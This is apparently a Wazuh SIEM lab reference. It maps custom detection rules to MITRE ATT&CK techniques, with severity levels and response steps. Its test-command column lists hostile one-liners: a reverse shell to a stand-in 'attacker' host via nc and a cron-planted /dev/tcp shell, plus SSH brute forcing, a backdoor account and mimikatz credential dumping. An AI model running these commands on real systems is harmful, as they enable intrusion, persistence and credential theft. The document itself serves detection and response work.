# MITRE ATT&CK Mapping - Wazuh SIEM Lab

This document maps custom Wazuh detection rules to the MITRE ATT&CK framework v14.

## Detection Matrix

| Wazuh Rule ID | Rule Name | MITRE Technique | MITRE Name | Tactic | Severity | Test Command |
|--------------|-----------|-----------------|------------|--------|----------|--------------|
| 100001 | SSH Brute Force | T1110.001 | Brute Force: Password Guessing | Credential Access | High (10) | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target` |
| 100002 | Privilege Escalation via sudo | T1548.003 | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | Privilege Escalation | High (8) | `sudo -i` or `sudo su` |
| 100003 | Crontab Modification | T1053.003 | Scheduled Task/Job: Cron | Persistence | High (7) | `echo "* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" \| crontab -` |
| 100004 | Reverse Shell | T1059.004 | Command and Scripting Interpreter: Bash | Execution | Critical (9) | `nc -e /bin/bash attacker 4444` |
| 100005 | New Local User | T1136.001 | Create Account: Local Account | Persistence | Medium (6) | `sudo useradd -m backdoor` |
| 100006 | Critical File Modification | T1098 | Account Manipulation | Persistence | High (8) | `sudo usermod -aG sudo attacker` |
| 100007 | Multiple Failed Logins | T1110 | Brute Force | Credential Access | High (7) | Repeated failed SSH attempts |
| 100008 | Credential Dumping | T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access | Critical (10) | `mimikatz # sekurlsa::logonpasswords` |

## MITRE Tactics Coverage

| Tactic | Techniques Covered | Rules |
|--------|-------------------|-------|
| Initial Access | - | - |
| Execution | T1059.004 | 100004 |
| Persistence | T1053.003, T1136.001, T1098 | 100003, 100005, 100006 |
| Privilege Escalation | T1548.003 | 100002 |
| Credential Access | T1110, T1110.001, T1003.001 | 100001, 100007, 100008 |
| Discovery | - | - |
| Lateral Movement | - | - |
| Collection | - | - |
| Command and Control | T1071 (implied via reverse shell) | 100004 |

## Alert Severity Levels

| Level | Color | Meaning | Rules |
|-------|-------|---------|-------|
| 6 | Yellow | Medium - Suspicious activity | 100005 |
| 7 | Orange | High - Likely malicious | 100003, 100007 |
| 8 | Red | High - Confirmed malicious | 100002, 100006 |
| 9 | Dark Red | Critical - Immediate response | 100004 |
| 10 | Critical | Critical - Active attack | 100001, 100008 |

## Response Playbook Mapping

| Rule ID | Immediate Action | Investigation Steps | Containment |
|---------|-----------------|---------------------|-------------|
| 100001 | Block source IP | Check /var/log/auth.log for successful logins | Fail2ban, firewall rule |
| 100002 | Alert SOC analyst | Check sudoers, audit commands history | Revoke sudo privileges |
| 100003 | Isolate endpoint | List all cron jobs, check for malicious payloads | Remove cron entries |
| 100004 | Block network connection | Capture packets, identify C2 server | Kill process, block IP |
| 100005 | Disable new account | Check account creation logs, home directory | `userdel -r backdoor` |
| 100006 | Restore from backup | Check file integrity, compare hashes | Revert changes |
| 100007 | Same as 100001 | Check if any attempt succeeded | Rate limiting |
| 100008 | Isolate endpoint immediately | Memory dump analysis, credential rotation | Force password reset |

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Wazuh Ruleset Documentation](https://documentation.wazuh.com/current/user-manual/ruleset/index.html)
- [Wazuh MITRE Integration](https://documentation.wazuh.com/current/user-manual/ruleset/mitre.html)
